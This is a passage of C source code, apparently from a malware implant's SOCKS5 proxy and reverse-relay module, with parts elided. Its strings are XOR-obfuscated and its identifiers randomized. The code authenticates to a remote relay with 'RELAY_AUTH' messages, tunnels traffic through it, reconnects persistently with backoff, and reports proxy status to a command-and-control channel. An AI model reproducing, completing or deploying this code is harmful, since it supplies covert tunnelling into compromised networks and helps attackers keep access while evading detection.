...
static int tcp_connect(const char *host, uint16_t port)
{
    ...
    snprintf(portbuf, sizeof(portbuf), _S(2,0x89,0xd9), (unsigned)port);
...
void ac8JR6M(int client_fd)
{
    ...
    if (atyp == _st8Wr2M) {
        ...
        snprintf(target_host, sizeof(target_host), _S(11,0x89,0xd9,0x82,0x89,0xd9,0x82,0x89,0xd9,0x82,0x89,0xd9),
    ...
    _nS5PJ8Y(_S(21,0xdf,0xc3,0xcf,0xc7,0xdf,0x99,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x96,0x8c,0x89,0xdf,0x96,0x89,0xd9), target_host, (unsigned)target_port);
...
int jw8CH7B(const char *port, _EA8up4M *c2)
{
    ...
    if (at_load(&_bS6gN5R)) {
        _nS5PJ8Y(_S(20,0xdf,0xc3,0xcf,0xc7,0xdf,0x8c,0xcd,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xcd,0xcf,0xd8,0xc5,0xda,0xc9));
        return -1;
    }

    portnum = atoi(port);
    if (portnum <= 0 || portnum > 65535) {
        _nS5PJ8Y(_S(22,0xdf,0xc3,0xcf,0xc7,0xdf,0x8c,0xc5,0xc2,0xda,0xcd,0xc0,0xc5,0xc8,0x8c,0xdc,0xc3,0xde,0xd8,0x96,0x8c,0x89,0xdf), port);
        return -1;
    }
    ...
    at_store(&_bg6ay7T, 0);
    at_store(&_bS6gN5R, 1);
    ds_set(&_dz3vg3W, _S(6,0xc8,0xc5,0xde,0xc9,0xcf,0xd8));
    pthread_mutex_unlock(&_NQ8CE5p);

    _nS5PJ8Y(_S(33,0xdf,0xc3,0xcf,0xc7,0xdf,0x8c,0xc0,0xc5,0xdf,0xd8,0xc9,0xc2,0xc9,0xde,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0x8c,0xc3,0xc2,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8), portnum);
    ...
    if (c2) {
        ds_init(&msg);
        {
            char tmp[128];
            char addr[64];
            snprintf(addr, sizeof(addr), _S(10,0x9c,0x82,0x9c,0x82,0x9c,0x82,0x9c,0x96,0x89,0xc8), portnum);
...
void tV4Lm4J(void)
{
    ...
    _nS5PJ8Y(_S(19,0xdf,0xc3,0xcf,0xc7,0xdf,0x8c,0xdc,0xde,0xc3,0xd4,0xd5,0x8c,0xdf,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8));
}
...
static void _hL3AH3U(_EA8up4M *data)
{
    ...
    _nS5PJ8Y(_S(19,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xdf,0xc3,0xcf,0xc7,0xdf,0x99,0x96,0x8c,0x89,0xdf,0x96,0x89,0xd9), target_host, (unsigned)target_port);
...
static void *_ov7Wz4e(void *arg)
{
    ...
    _nS5PJ8Y(_S(28,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xdf,0xc9,0xdf,0xdf,0xc5,0xc3,0xc2,0x8c,0x89,0xdf,0x96,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc2,0xcb), ctx->session_id);

    data = hq4zK8c(ctx->host, ctx->port);
    if (!data) {
        _nS5PJ8Y(_S(32,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xdf,0xc9,0xdf,0xdf,0xc5,0xc3,0xc2,0x8c,0x89,0xdf,0x96,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8), ctx->session_id);
        free(ctx);
        return NULL;
    }

    snprintf(line, sizeof(line), _S(14,0xfe,0xe9,0xe0,0xed,0xf5,0xf3,0xe8,0xed,0xf8,0xed,0x96,0x89,0xdf,0xa6), ctx->session_id);
    Ng2ZR5y(data, line);
...
static _EA8up4M *_Mk3hZ4Z(const char *host, const char *port)
{
    ...
    snprintf(auth_msg, sizeof(auth_msg), _S(17,0xfe,0xe9,0xe0,0xed,0xf5,0xf3,0xed,0xf9,0xf8,0xe4,0x96,0x89,0xdf,0x96,0x89,0xdf,0xa6),
             ds_cstr(&_Lv3Qk8T), ds_cstr(&_yg5RE4m));
    Ng2ZR5y(ctrl, auth_msg);

    resp = Un4Ss4D(ctrl, 10);
    if (strcmp(ds_cstr(&resp), _S(8,0xfe,0xe9,0xe0,0xed,0xf5,0xf3,0xe3,0xe7)) != 0) {
        _nS5PJ8Y(_S(22,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xcd,0xd9,0xd8,0xc4,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x96,0x8c,0x89,0xdf), ds_cstr(&resp));
        ds_free(&resp);
        ZR8pH4D(ctrl);
        return NULL;
    }
...
static void *_Ps6HH5c(void *arg)
{
    ...
    for (;;) {
        ...
        while (!at_load(&_bg6ay7T) && ctrl->valid) {
            ...
            if (ds_len(&line) == 0) {
                ...
                Ng2ZR5y(ctrl, _S(1,0xa6));
                continue;
            }

            if (strncmp(ds_cstr(&line), _S(10,0xfe,0xe9,0xe0,0xed,0xf5,0xf3,0xe2,0xe9,0xfb,0x96), 10) == 0) {
        ...
        _nS5PJ8Y(_S(52,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xc8,0xc5,0xdf,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc9,0xc8,0x8c,0xca,0xde,0xc3,0xc1,0x8c,0x89,0xdf,0x96,0x89,0xdf,0x80,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0xc5,0xc2,0xcb,0x8c,0xde,0xc9,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8), ctx->host, ctx->port);

        /* Notify C2 that relay dropped */
        if (ctx->c2 && ctx->c2->valid) {
            char sbuf[320];
            snprintf(sbuf, sizeof(sbuf), _S(33,0xf7,0xdf,0xc3,0xcf,0xc7,0xdf,0xf1,0x8c,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xc8,0xc5,0xdf,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc9,0xc8,0x8c,0x89,0xdf,0x96,0x89,0xdf,0xa6), ctx->host, ctx->port);
            Ng2ZR5y(ctx->c2, sbuf);
        }
        ...
        while (!at_load(&_bg6ay7T)) {
            ...
            if (reconnect_count > 0 && (reconnect_count % _zx6MU2u) == 0) {
                _nS5PJ8Y(_S(41,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0x89,0xc8,0x8c,0xde,0xc9,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0xdf,0x80,0x8c,0xdc,0xcd,0xd9,0xdf,0xc5,0xc2,0xcb,0x8c,0x89,0xc8,0xdf), reconnect_count, _Uy5AD3z);
                sleep(_Uy5AD3z);
            ...
            _nS5PJ8Y(_S(36,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xde,0xc9,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0x8c,0x89,0xc8,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf), reconnect_count, ctx->host, ctx->port);
            ctrl = _Mk3hZ4Z(ctx->host, ctx->port);
            if (ctrl) {
                _nS5PJ8Y(_S(40,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xde,0xc9,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc9,0xc8,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf,0x8c,0x84,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0x8c,0x89,0xc8,0x85), ctx->host, ctx->port, reconnect_count);
                reconnect_count = 0;
                ...
                if (ctx->c2 && ctx->c2->valid) {
                    char sbuf[320];
                    snprintf(sbuf, sizeof(sbuf), _S(31,0xf7,0xdf,0xc3,0xcf,0xc7,0xdf,0xf1,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0x8c,0xc3,0xc2,0x8c,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x89,0xdf,0x96,0x89,0xdf,0xa6), ctx->host, ctx->port);
                    Ng2ZR5y(ctx->c2, sbuf);
                }
    ...
    if (ctx->c2 && ctx->c2->valid) {
        Ng2ZR5y(ctx->c2, _S(22,0xf7,0xdf,0xc3,0xcf,0xc7,0xdf,0xf1,0x8c,0xdc,0xde,0xc3,0xd4,0xd5,0x8c,0xdf,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6));
    }
    ...
    free(ctx);
    _nS5PJ8Y(_S(24,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xcf,0xc3,0xc2,0xd8,0xde,0xc3,0xc0,0x8c,0xc0,0xc3,0xc3,0xdc,0x8c,0xc9,0xc2,0xc8,0xc9,0xc8));
    return NULL;
}
...
int MA2zo8a(const char *host, const char *port, _EA8up4M *c2)
{
    ...
    if (at_load(&_bS6gN5R)) {
        _nS5PJ8Y(_S(21,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xcd,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xcd,0xcf,0xd8,0xc5,0xda,0xc9));
    ...
    for (attempt = 0; attempt < _GC4bU4r; attempt++) {
        if (attempt > 0) {
            _nS5PJ8Y(_S(30,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xc6,0xc3,0xc5,0xc2,0x8c,0xde,0xc9,0xd8,0xde,0xd5,0x8c,0x89,0xc8,0x83,0x89,0xc8,0x8c,0xc5,0xc2,0x8c,0x89,0xc8,0xdf), attempt + 1, _GC4bU4r, _bg2HQ6m);
            sleep(_bg2HQ6m);
        }
        _nS5PJ8Y(_S(42,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc2,0xcb,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf,0x8c,0x84,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0x8c,0x89,0xc8,0x83,0x89,0xc8,0x85), host, port, attempt + 1, _GC4bU4r);
        ctrl = _Mk3hZ4Z(host, port);
        if (ctrl) break;
    }

    if (!ctrl) {
        _nS5PJ8Y(_S(39,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x8c,0xd8,0xc3,0x8c,0xc6,0xc3,0xc5,0xc2,0x8c,0xcd,0xca,0xd8,0xc9,0xde,0x8c,0x89,0xc8,0x8c,0xcd,0xd8,0xd8,0xc9,0xc1,0xdc,0xd8,0xdf), _GC4bU4r);
        return -1;
    }
    ...
    {
        char addr[280];
        snprintf(addr, sizeof(addr), _S(11,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x89,0xdf,0x96,0x89,0xdf), host, port);
        ds_set(&_dz3vg3W, addr);
    }
    pthread_mutex_unlock(&_NQ8CE5p);

    _nS5PJ8Y(_S(29,0xde,0xc9,0xc0,0xcd,0xd5,0x96,0x8c,0xcd,0xd9,0xd8,0xc4,0xc9,0xc2,0xd8,0xc5,0xcf,0xcd,0xd8,0xc9,0xc8,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf), host, port);
